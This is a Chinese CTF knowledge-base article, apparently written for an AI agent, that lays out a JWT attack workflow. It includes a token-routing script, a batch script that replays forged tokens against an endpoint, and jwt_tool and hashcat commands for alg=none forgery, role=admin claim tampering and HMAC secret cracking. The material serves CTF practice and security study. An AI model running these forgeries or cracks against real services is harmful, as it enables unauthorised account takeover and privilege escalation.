---
id: "ctf-website/02-auth/jwt/09-toolchain-operations"
title: "JWT 工具链、操作流程与结果矩阵"
title_en: "JWT Toolchain, Operations Workflow, and Result Matrix"
summary: >
  汇总 JWT 攻击链的工具组合、五阶段操作流程、payload 生成器、批量 oracle、证据模板和结果矩阵。目标是让 Agent 从一个 token 出发，按 alg/kid/jku/claim/secret/CVE 信号自动分流，并把每个变体的成功与失败样本落成可复查证据。
summary_en: >
  A JWT attack-chain operations playbook covering tool combinations, a five-stage workflow, payload generators, batch oracles, evidence templates, and result matrices. It routes one token into alg/kid/jku/claim/secret/CVE paths and records success/failure samples.
board: "ctf-website"
category: "02-auth"
signals: ["jwt_tool", "hashcat", "工具链", "攻击流程", "结果矩阵", "JWT", "jwt-cracker", "Burp"]
mcp_tools: ["http_probe", "ctf_tool_status", "kb_router"]
keywords: ["JWT工具链", "jwt_tool", "hashcat jwt", "JWT对抗", "token操作", "jwt攻击流程", "JWT oracle"]
difficulty: "advanced"
tags: ["authentication", "jwt", "toolchain", "operations", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/02-auth/jwt/00-overview"]
---

# JWT 工具链、操作流程与结果矩阵

本篇是 JWT 子目录的执行层：拿到 token 后，先解码和定向路由，再用最少变体打同一业务 oracle。不要让工具“全自动扫一遍”替代判断；每个命中都必须能解释是哪个校验被穿透。

## 输入信号

| 信号 | 工具优先级 | 下一跳 |
|---|---|---|
| `alg=none` 或无签名 token | `jwt_tool -X n` + 手工空签名变体 | `01-alg-none` |
| `RS256/ES256` + 可取公钥 | PEM/JWK 提取 + HS 重签 | `02-algorithm-confusion` |
| `HS256/HS384/HS512` | hashcat `-m 16500` + 规则字典 | `03-weak-key-bruteforce` |
| `kid` 存在 | traversal/SQL/URL/空 key 变体 | `04-kid-injection` |
| `jku/x5u/x5c` 存在 | 自建 JWKS + kid 对齐 | `05-jku-x5u-abuse` |
| `exp/aud/iss/typ/scope` 可疑 | claim 单变量突变 | `06-claim-missing` |
| 错误文本暴露库 | 指纹脚本 + 版本路由 | `08-cve-library` |

## 0. 五阶段流程

```text
捕获 token
  → 解码 header/claims
  → 路由到最可能的 1-2 条技术线
  → 生成单变量 token 变体
  → 对同一业务 oracle 批量验证
  → 输出 Evidence 和下一跳
```

## 1. 工具组合

| 工具 | 用途 | 输出 |
|---|---|---|
| `jwt_tool.py` | 解码、none、kid、claim 修改、常见攻击模块 | token 变体、扫描日志 |
| `hashcat -m 16500` | HMAC secret 爆破 | secret、hashcat potfile |
| `jwt-cracker` | CPU 快速扫短 secret | secret 候选 |
| Burp JWT Editor | 手工改 header/claim、重放 | Repeater 证据 |
| `openssl` | RSA/EC 公钥、证书、x5c 处理 | PEM/JWK 互转材料 |
| Python `pyjwt/cryptography` | 自定义批量生成 | JSONL payload 集 |
| `curl/httpie` | 固定 oracle | 状态码、响应 hash、业务字段 |

## 2. token 快速路由器

```python
#!/usr/bin/env python3
import argparse
import base64
import json

def dec(part):
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part.encode()))

def route(header, payload):
    alg = (header.get("alg") or "").upper()
    out = []
    if alg == "NONE" or not header.get("alg"):
        out.append("01-alg-none")
    if alg.startswith("RS") or alg.startswith("ES"):
        out.append("02-algorithm-confusion")
    if alg.startswith("HS"):
        out.append("03-weak-key-bruteforce")
    if "kid" in header:
        out.append("04-kid-injection")
    if any(k in header for k in ("jku", "x5u", "x5c")):
        out.append("05-jku-x5u-abuse")
    if any(k not in payload for k in ("exp", "iss", "aud")) or payload.get("typ") in ("id", "id_token"):
        out.append("06-claim-missing")
    return out or ["08-cve-library"]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("token")
    args = ap.parse_args()
    h, p, *_ = args.token.split(".")
    header, payload = dec(h), dec(p)
    print(json.dumps({"header": header, "payload": payload, "routes": route(header, payload)}, ensure_ascii=False, indent=2))

if __name__ == "__main__":
    main()
```

## 3. 批量 oracle

将工具生成的 token 保存为 JSONL，每行格式：`{"case":"alg_none_role_admin","token":"..."}`。oracle 只做一件事：固定同一个业务接口，记录可比较结果。

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
from pathlib import Path
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def read_jsonl(path):
    for line in Path(path).read_text(encoding="utf-8").splitlines():
        if line.strip():
            yield json.loads(line)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--tokens", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--header", action="append", default=[])
    args = ap.parse_args()
    base_headers = {}
    if args.cookie:
        base_headers["Cookie"] = args.cookie
    for item in args.header:
        k, v = item.split(":", 1)
        base_headers[k.strip()] = v.strip()
    for item in read_jsonl(args.tokens):
        headers = dict(base_headers)
        headers["Authorization"] = f"Bearer {item['token']}"
        r = requests.get(args.url, headers=headers, timeout=10)
        try:
            body = r.json()
        except Exception:
            body = {"raw": r.text[:300]}
        print(json.dumps({
            "case": item["case"],
            "status": r.status_code,
            "hash": h(r.text),
            "location": r.headers.get("Location", ""),
            "user": body.get("user", body.get("sub", "")) if isinstance(body, dict) else "",
            "role": body.get("role", body.get("scope", "")) if isinstance(body, dict) else "",
            "flag_hit": any(s in r.text for s in ("flag{", "CTF{", "DASCTF{")),
        }, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

判定矩阵：

| 差异 | 解释 |
|---|---|
| `status/hash/user/role` 全变 | token 变体进入业务逻辑 |
| status 相同但 hash 变 | 可能进入不同错误分支，继续看错误文本 |
| 全部同 hash | 当前路线未穿透，换 oracle 或下一条路线 |
| `flag_hit=true` | 固定完整请求/响应，回填 Evidence |

## 4. payload 组织规范

```json
{"case":"baseline","route":"00-overview","token":"<original>"}
{"case":"alg_none_role_admin","route":"01-alg-none","token":"<variant>"}
{"case":"rs_public_as_hs","route":"02-algorithm-confusion","token":"<variant>"}
{"case":"kid_traversal_devnull","route":"04-kid-injection","token":"<variant>"}
{"case":"claim_aud_missing","route":"06-claim-missing","token":"<variant>"}
```

每个 case 名必须包含路线和变量，不要只写 `test1/test2`。

## 5. 命令速查

```bash
# 解码
python3 jwt_tool.py "$TOKEN"

# none
python3 jwt_tool.py "$TOKEN" -X n -I -pc role -pv admin

# HMAC secret
hashcat -m 16500 jwt.txt rockyou.txt
python3 jwt_tool.py "$TOKEN" -C -d rockyou.txt

# claim 单变量
python3 jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999
python3 jwt_tool.py "$TOKEN" -I -pc role -pv admin

# JWKS/OIDC
curl -s https://target.example/.well-known/openid-configuration
curl -s https://target.example/.well-known/jwks.json
```

## 6. Evidence

| 项 | 记录内容 |
|---|---|
| 原始 token | header/payload、来源、获取时间、业务 oracle |
| 路由理由 | alg/kid/jku/claim/错误文本/库版本等触发信号 |
| payload 集 | JSONL case、token 前缀、路线、单变量说明 |
| oracle 结果 | `status/hash/location/user/role/flag_hit` |
| 成功样本 | 伪造 token 触发身份、权限、数据、订单、flag 差异 |
| 失败样本 | 同一错误 hash、签名错误、claim 错误、key not found、token expired |
| 下一跳 | 命中的路线文件、需要补的公钥/secret/JWKS/日志证据 |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| 路由 | `kb_router` | 按 alg/kid/jku/claim/CVE 信号找文件 |
| 工具状态 | `ctf_tool_status` | 检查 jwt_tool/hashcat 等是否可用 |
| HTTP oracle | `http_probe` | 固定 header 和响应 hash 批量验证 |
